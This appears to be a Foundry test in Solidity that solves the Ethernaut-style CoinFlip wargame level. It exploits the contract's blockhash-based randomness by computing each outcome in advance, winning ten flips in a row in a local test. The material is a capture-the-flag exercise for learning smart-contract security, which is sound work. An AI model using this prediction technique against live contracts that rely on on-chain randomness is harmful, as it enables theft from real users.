pragma solidity ^0.8.0;

import "../../src/3_CoinFlip/CoinFlip.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract CoinFlipTest is Test {
    CoinFlip public victim;
    address public owner;
    address public addr1;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {
        owner = vm.addr(1);
        addr1 = vm.addr(2);

        vm.deal(addr1, 1 ether);

        vm.prank(owner);
        victim = new CoinFlip();
    }

    function testAttack() public {
        //ingreasr valor al diccionario

        vm.startPrank(addr1);

       for (uint256 i = 0; i < 10; i++) {
            bool guess = computeGuess();
            victim.flip(guess);
            vm.roll(block.number + 1);
        }

        assertEq(victim.consecutiveWins(), 10);

    }

    function computeGuess() private view returns (bool) {
        uint256 latestBlockNumber = block.number - 1;
        uint256 blockValue = uint256(blockhash(latestBlockNumber));
        uint256 flip = blockValue / FACTOR;
        return flip == 1;
    }
}
